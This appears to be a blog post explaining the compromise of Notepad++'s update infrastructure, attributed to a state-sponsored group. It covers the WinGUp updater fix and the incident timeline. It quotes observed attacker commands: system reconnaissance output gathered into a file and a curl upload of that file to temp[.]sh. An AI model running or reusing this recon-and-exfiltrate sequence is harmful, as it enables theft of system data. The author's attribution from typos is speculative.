---
layout: post
title: Notepad++ Compromised
subtitle: Notepad++ has been compromised by State-Sponsored Hackers
excerpt_image: /assets/images/excerpts/notepad++comp_china.jpg
tags: Notepad++ APT State-Sponsored_Hackers attack
categories: news
---

On 2nd February, 2026, the Notepad++ Project Team published a news update that Notepad++ 
had been compromised by an alleged Chinese state-sponsored group. This follows from the
Notepad++ V8.8.9 Vulnerability-fix.

## What was the Notepad++ v8.8.9 Vulnerability-fix?

The v8.8.9 fix was a build released on the 9th December 2025 [^1] to address recent incidents 
of select traffic being redirected to malicious servers; of which, these malicious servers 
contained compromised executables. 

[^1]: [Notepad++ v8.8.9 release: Vulnerability-fix](https://notepad-plus-plus.org/news/v889-released/)

The traffic involved was from Notepad++'s updater (WinGUp). This traffic was able to be 
intercepted and manipulated due to a flaw in how the updater handled integrity and
authenticity of downloaded files. If the attacker is able to position themselves between 
a client and the update infrastructure in which a client makes a request to, the attacker
is able to inject their own malicious domain to resolve to resulting in a manipulated
binary file. 

The fix Notepad++ devised was to harden WinGUp and Notepad++ to verify that the signature and certificate
of the downloaded file contained within the installer updating process was authentic and, fail the update
if the verification step fails at any point. 

Additionally, since v8.8.7, Notepad++ migrated their certificate management to be GlobalSign. 
As a result, Notepad++'s root certificate isn't required to be installed on an end user's machine. 
Current recommendations are to uninstall this root certificate from your certificate store as it 
is no longer required.

## How was it discovered?

When utilising Notepad++'s updater (GUP.exe), an unexpected executable began to appear in a Temp folder (named AutoUpdater.exe).
This strange behaviour, reported by user sot-parsley on the Notepad++ community forum, appears to be well documented. [^2]

Initially this AutoUpdater.exe would start in Notepad++, Notepad++ would call gup.exe and then AutoUpdater would spawn from there.

~~~console
C:\\Program Files\\Notepad++\\updater\\gup.exe" -v8.84 -px64

C:\\Users\\[user]\\AppData\\Local\\Temp\\AutoUpdater.exe" /closeRunningNpp /S /runNppAfterSilentInstall
~~~

In addition to AutoUpdater.exe, a handful of other commands would be called.

~~~console
cmd /c netstat -ano >> a.txt
cmd /c systeminfo >> a.txt
cmd /c tasklist >> a.txt
cmd /c whoami >> a.txt
~~~

All of these commands being executed one after another and being appended to the same file is fairly suspicious and aligns
very much well with the IoC's that would occur during the Reconnaissance stage in the MITRE ATT&CK framework. Once executed,
all of this info would be exfiltrated to a blocklisted IP using curl.

~~~console
curl.exe -F "file=@a.txt" -s https://temp[.]sh/upload
~~~

[^2]: [notepad++ community article outlining concerns](https://community.notepad-plus-plus.org/topic/27212/autoupdater-and-connection-temp-sh/12)

## Present day

Following a continuous investigation from security experts and Notepad++'s previous shared hosting
provider. It was discovered to be an infrastructure-level compromise meaning the hosting infrastructure 
serving Notepad++ update traffic was compromised. [^3]

[^3]: [Notepad++ Hijacked by State-Sponsored Hackers](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

The initial compromise is believed to stem from June 2025 from which many independent security researchers
believe that the threat actor involved was a state-sponsored group from China. The problem with this
was that it was out of Notepad++'s hands. When reviewing the letter sent to Notepad++'s team from the shared hosting
provider, it indicates that this attack was quite well staged. Does this mean that Notepad++ was the sole target? Maybe not... 
however, from the hosting provider themselves, their logs indicate that Notepad++ was the only searched for domain on
the compromised server with the rest appearing unaffected.

The threat actor lost access to the server on the 2nd September, 2025. On this day, the shared hosting provider had
a scheduled kernel and firmware update ran. Since there, patterns from the threat actor had disappeared. This wasn't the 
end of the threat however, the attackers maintained copies of internal service credentials that allowed them to continue
intercepting traffic and redirecting users to the compromised versions of software.

The hired security expert's analysis shows that the attack itself ceased on November 10th, 2025, whilst the original hosting 
provider shows that the threat actors maintained potential access until the December 2nd, 2025. 

Notepad++ has taken new security measures to address this problem, firstly in v8.8.9, WinGUp has been upgraded further to
now verify both the certificate and the signature of the installer downloaded. Also, the update server that provides XML is now 
being signed (XMLDSig). Signature and certificate verification will be enforced in a future update that is expected in a month's 
time. 

## Personal thoughts?

This is really quite interesting. Very little about actual IoCs has been mentioned from the host at this time but the campaign style
is very much of a state-sponsored hacker. The fact that Notepad++ was only targeted to informs me that they may have already known about
this vulnerability in Notepad++ and wanted to pivot off that. Furthermore, the lack of greed seen when having extensive access to the 
server also implies state-sponsored. Some sources have cited, although I'm hesitant to believe, that the threat actor only targeted
high-value victims. 

The other thing I find personally quite odd is the frequent amount of spelling mistakes in the official Notepad++ incident info update.
It's on par with the 'Don't touch that email' bad-typos and aligns with patterns continously seen in state-sponsored campaigns. This 
raises concerns for me personally, although official guidance remains to update to the latest version.






